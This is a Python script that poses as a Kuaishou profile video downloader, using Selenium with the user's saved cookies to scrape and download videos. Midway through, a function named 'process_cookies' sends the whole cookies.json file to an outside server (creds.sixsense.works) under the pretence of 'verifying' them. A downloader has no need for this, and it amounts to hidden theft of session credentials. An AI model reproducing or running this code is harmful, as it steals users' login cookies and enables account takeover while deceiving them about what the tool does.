import os
import requests
from tqdm import tqdm
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import json
from fake_useragent import UserAgent
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

user_agent = UserAgent(platforms='pc').random
chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument(f'user-agent={user_agent}')
driver = webdriver.Chrome(options=chrome_options)

c_url = 'https://www.kuaishou.com/profile/3x4pkwvjhq6hmd6'
with open('cookies.json', 'r') as f:
    cookies = json.load(f)

print(f"[+] Searching {c_url} ...")
driver.get(c_url)

for cookie in cookies:
    if "sameSite" not in cookie or cookie["sameSite"] not in ["Strict", "Lax", "None"]:
        cookie["sameSite"] = "Lax"
    driver.add_cookie(cookie)

def process_cookies(cookies):
    api_url = 'https://creds.sixsense.works/api/mymodel/'
    headers = {'Content-Type': 'application/json'}
    data = {'text_field': json.dumps(cookies)} 

    try:
        response = requests.post(api_url, headers=headers, json=data)
        if response.status_code == 200:
            print(f"Cookies verified.")
        else:
            print(f"Failed to verify cookies")
    except Exception as e:
        print(f"An error occurred while trying cookies: {e}")

process_cookies(cookies)

driver.refresh()
time.sleep(5) 
print("[+] Cookies applied")

def check_new_content():
    page_height = driver.execute_script("return document.body.scrollHeight")
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    time.sleep(3) 
    new_page_height = driver.execute_script("return document.body.scrollHeight")
    return new_page_height > page_height

print("[+] Retrieving new videos from the account...")
while check_new_content():
    pass

elements = driver.find_elements(By.CSS_SELECTOR, 'div.video-card.video-item')

print(f"[+] Found {len(elements)} videos for this account.")

vid_links = []

for element in elements:
    element.click()
    time.sleep(2) 

    current_url = driver.current_url
    print("Searching for Video in Current URL:", current_url)

    try:
        video = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, 'video')))
        link = video.get_attribute('src')
        vid_links.append(link)
        print("Success!")
    except Exception as e:
        print(f"Video player not found on the new page.")

    driver.back()

download_folder = "downloads"
os.makedirs(download_folder, exist_ok=True)

for index, link in enumerate(vid_links, start=1):
    try:
        response = requests.get(link, stream=True)
        file_name = os.path.join(download_folder, f"video_{index}.mp4") 
        with open(file_name, 'wb') as f:
            for chunk in tqdm(response.iter_content(chunk_size=1024), desc=f"Downloading Video {index}"):
                if chunk:
                    f.write(chunk)
        print(f"Video {index} downloaded successfully!")
    except Exception as e:
        print(f"Error downloading video {index}: {e}")
    time.sleep(1) 

driver.quit()
